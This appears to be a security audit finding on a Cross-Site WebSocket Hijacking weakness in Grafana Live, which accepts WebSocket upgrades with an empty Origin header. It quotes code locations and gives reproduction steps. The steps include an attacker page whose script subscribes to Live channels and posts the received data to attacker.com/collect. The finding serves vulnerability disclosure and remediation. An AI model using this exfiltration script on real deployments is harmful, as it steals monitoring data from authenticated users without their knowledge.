Phase: 8
Sequence: 021
Slug: websocket-empty-origin-cswsh
Verdict: VALID
Rationale: getCheckOriginFunc (live.go:537-539) and checkSameHost (pushws/ws.go:54-58) unconditionally accept WebSocket upgrades when the Origin header is empty, violating RFC 6455 recommendations. Advocate confirmed modern browsers send Origin on WebSocket upgrades but could not disprove the reverse-proxy-stripping scenario, which is a real deployment pattern in nginx/HAProxy environments.
Severity-Original: MEDIUM
PoC-Status: theoretical
Pre-FP-Flag: check-1-ambiguous (attacker control depends on external reverse proxy configuration)
Debate: security/chamber-workspace/chamber-2/debate.md

## Summary

Grafana Live's WebSocket origin check functions (`getCheckOriginFunc` at `live.go:537-539` and `checkSameHost` at `pushws/ws.go:54-58`) unconditionally return true when the `Origin` header is empty or absent. Per RFC 6455 Section 10.2, servers should check the Origin header and reject connections from unexpected origins. The empty-Origin bypass allows Cross-Site WebSocket Hijacking (CSWSH) in deployments where a reverse proxy strips the Origin header before forwarding to Grafana. An attacker's malicious page can cause a victim's authenticated browser to establish a WebSocket connection to Grafana Live, subscribing to real-time data channels and receiving metric streams, alert state updates, and dashboard events.

## Location

- **Primary**: `pkg/services/live/live.go:535-563` -- `getCheckOriginFunc` returns `true` when `origin == ""`
- **Secondary**: `pkg/services/live/pushws/ws.go:54-58` -- `checkSameHost` returns `nil` when `origin == ""`
- **WebSocket handler registration**: `live.go:387-389` -- `group.Get("/ws", g.websocketHandler)` with `middleware.ReqSignedIn`
- **Push WebSocket**: `live.go:391-398` -- separate push WebSocket endpoint with same origin check pattern

## Attacker Control

- **Attack vector**: Attacker hosts a malicious page at `https://attacker.com/exploit.html` containing JavaScript that opens a WebSocket to `wss://grafana.target.com/api/live/ws`
- **Precondition 1**: Victim must be authenticated to Grafana with a session cookie (middleware.ReqSignedIn)
- **Precondition 2**: A reverse proxy between the victim's browser and Grafana must strip the Origin header. This is observed in:
  - nginx configurations with `proxy_set_header Origin ""` or omitting Origin passthrough
  - HAProxy configurations without explicit header forwarding
  - Some CDN/WAF products that strip non-standard headers
- **Channel subscription**: Once connected, attacker's JavaScript subscribes to Grafana Live channels via Centrifuge protocol messages

## Trust Boundary Crossed

Browser same-origin policy boundary. The WebSocket connection crosses from the attacker's origin (attacker.com) to the Grafana server, authenticated via the victim's session cookie. The same-origin protection (Origin header check) is bypassed because the reverse proxy strips Origin.

## Impact

- **Real-time data exfiltration**: Attacker receives data published to Grafana Live channels:
  - Dashboard activity events (which dashboards are being viewed, by whom)
  - Alert state transitions (which alerts are firing, resolving)
  - Datasource-scoped metric streams (if datasource streaming is enabled via plugin)
  - Plugin streaming data
- **Scope limitation**: Channel-level authorization (live.go:664-772 handleOnSubscribe) restricts access based on the victim's permissions. The attacker sees only what the victim is authorized to see.
- **Severity factors**: MEDIUM because (1) requires reverse proxy misconfiguration external to Grafana, (2) modern browsers send Origin on WebSocket upgrades making direct CSWSH impossible without the proxy stripping, (3) data exposure is limited to Live channel data within the victim's permission scope

## Evidence

**Empty Origin accepted unconditionally:**
```go
// live.go:535-539
func getCheckOriginFunc(appURL *url.URL, originPatterns []string, originGlobs []glob.Glob) func(r *http.Request) bool {
    return func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        if origin == "" {
            return true  // BYPASS: no origin check performed
        }
```

```go
// pushws/ws.go:54-58
func checkSameHost(r *http.Request) error {
    origin := r.Header.Get("Origin")
    if origin == "" {
        return nil  // BYPASS: same pattern
    }
```

**Authentication required but cookie-based CSWSH still possible:**
```go
// live.go:387-389
routeRegister.Group("/api/live", func(group routing.RouteRegister) {
    group.Get("/ws", g.websocketHandler)
}, middleware.ReqSignedIn, ...)
```

**Correct behavior comparison**: The `originPatterns` and `originGlobs` parameters provide proper origin checking when Origin is present (live.go:541-561), but the empty-Origin short-circuit at line 538-539 bypasses all of this.

## Reproduction Steps

1. Deploy Grafana behind nginx with a configuration that does not forward Origin:
   ```nginx
   location / {
       proxy_pass http://grafana:3000;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection "upgrade";
       # Note: Origin header not forwarded
   }
   ```
2. Authenticate a victim user to Grafana via browser (session cookie set)
3. Host an attacker page at `https://attacker.com/exploit.html`:
   ```html
   <script>
   const ws = new WebSocket('wss://grafana.target.com/api/live/ws');
   ws.onmessage = (e) => {
       // Exfiltrate received data
       fetch('https://attacker.com/collect', {method: 'POST', body: e.data});
   };
   ws.onopen = () => {
       // Subscribe to channels via Centrifuge protocol
       ws.send(JSON.stringify({subscribe: {channel: 'grafana/dashboard/activity'}}));
   };
   </script>
   ```
4. Victim visits `https://attacker.com/exploit.html` while authenticated to Grafana
5. The WebSocket upgrade request reaches Grafana without an Origin header (stripped by nginx)
6. `getCheckOriginFunc` returns true (origin == "")
7. WebSocket connection established with victim's session credentials
8. Attacker receives real-time Grafana Live data
